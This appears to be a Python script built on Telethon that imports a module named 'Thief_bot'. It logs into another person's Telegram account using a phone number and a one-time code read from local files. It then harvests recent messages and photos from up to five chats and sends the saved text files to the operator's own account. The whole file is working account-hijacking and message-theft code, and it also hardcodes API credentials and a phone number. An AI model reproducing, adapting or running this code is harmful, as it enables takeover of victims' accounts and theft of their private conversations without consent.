from telethon.tl.types import MessageMediaPhoto
from telethon.utils import get_display_name
from telethon.sync import TelegramClient
import time
from Telebots import Thief_bot

print("Hello world")
api_id = 1005783
api_hash = '09cb354a26d71b92d9c12e06a7760732'
phone_01 = '+380635362036'
phone = str
new_data = str
time_01 = 0
client  = TelegramClient(phone_01, api_id, api_hash).start()
receiver = client.get_me()

while time_01 < 5:
    time.sleep(5)
    f = open("Phone.txt", "r")
    file_text_01 = f.read()
    print('phone waiting')
    if len(file_text_01)>4:
        print('PHONE EXECUTED')
        phone = file_text_01
        time_01=10
        client_01 = TelegramClient(phone, api_id, api_hash)
        client_01.connect()
        if not client_01.is_user_authorized():
            client_01.sign_in(phone)
            time.sleep(30)
            f = open("Start.txt", "r")
            file_text_02 = f.read()
            print('start waiting')
            if len(file_text_02) > 4:
                new_data = file_text_02
                print('START BEGIN')
            time.sleep(2)
            client_01.sign_in(phone, code = new_data)
            f = open("Start.txt", "w+")
            f.write('1')
            f = open("Phone.txt", "w+")
            f.write('1')
            time_01= 0

        dialogs = client_01.get_dialogs(limit = 5)
        file_list = []
        for n, dialog_iter in enumerate(dialogs, start=0):
            i = 0
            entity = dialog_iter.entity
            messages = client_01.get_messages(entity, limit=100)
            for iter, message in enumerate(messages, start=0):
                media = message.photo
                if 'MessageMediaPhoto' in str(message):
                    print("Will download image")
                    download_res = client_01.download_media(
                        media)
                    print("Download done: {}".format(download_res))
                else:
                    try:
                        f = open("{}.txt".format(get_display_name(entity)), "a+")
                        f.write("\n" + str(message.to_id) + "\n" + str(message.message))
                        if get_display_name(entity) not in file_list:
                            file_list.append(str(get_display_name(entity)))
                            print(file_list)
                    except UnicodeEncodeError:
                        continue
                    except OSError:
                        if '>'or '<' or'?'or'/'or'\\'or'|' in get_display_name(entity):
                            f = open("{}.txt".format(str(message.chat_id)), "a+")
                            f.write("\n" + str(message.to_id) + "\n" + str(message.message))
                            if str(message.chat_id) not in file_list:
                                file_list.append(str(message.chat_id))
                                print(file_list)
        client_01.disconnect()
        time_01 = 0
        print(file_list[0])
        client.send_file(receiver, file = str(file_list[0])+'.txt')
        client.send_file(receiver, file=str(file_list[1]) + '.txt')
        client.send_file(receiver, file=str(file_list[2]) + '.txt')
        client.send_file(receiver, file=str(file_list[3]) + '.txt')
